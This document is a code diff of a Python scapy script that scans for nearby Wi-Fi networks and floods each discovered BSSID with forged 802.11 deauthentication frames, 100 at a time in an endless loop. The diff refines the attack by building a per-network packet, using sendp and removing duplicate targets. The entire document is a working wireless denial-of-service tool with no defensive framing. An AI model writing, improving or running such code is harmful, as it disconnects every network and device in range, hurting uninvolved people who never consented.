@@ -3,17 +3,16 @@ from scapy.layers.dot11 import Dot11, Dot11Deauth
 from scapy.all import sniff
 
 # Define the interface to use
-interface = "wlan0"
-
-# Define the packet to send
-packet = Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55") / Dot11Deauth(reason=7)
+interface = "wlan0"  # Change this to your wireless interface
 
 # List to store networks
 scanned_networks = []
 
 # Define the function to send deauth packets
-def send_deauth(packet):
-    scapy.send(packet, iface=interface, verbose=0)
+def send_deauth(bssid):
+    # Create a deauth packet with the BSSID
+    packet = Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
+    scapy.sendp(packet, iface=interface, count=100, verbose=0)
 
 # Define the function to scan for nearby networks
 def scan_networks():
@@ -21,7 +20,8 @@ def scan_networks():
         if pkt.haslayer(Dot11):
             bssid = pkt[Dot11].addr2
             ssid = pkt[Dot11].info.decode() if pkt[Dot11].info else "<hidden>"
-            scanned_networks.append((bssid, ssid))
+            if (bssid, ssid) not in scanned_networks:
+                scanned_networks.append((bssid, ssid))
 
     # Use scapy to sniff for nearby networks
     sniff(iface=interface, prn=packet_handler, count=10)
@@ -41,8 +41,5 @@ while True:
 
     # Loop through each network and send deauth packets
     for bssid, ssid in scanned_networks:
-        # Create a deauth packet with the BSSID
-        packet[Dot11].addr1 = bssid
-
         # Send the deauth packet
-        send_deauth(packet)
+        send_deauth(bssid)
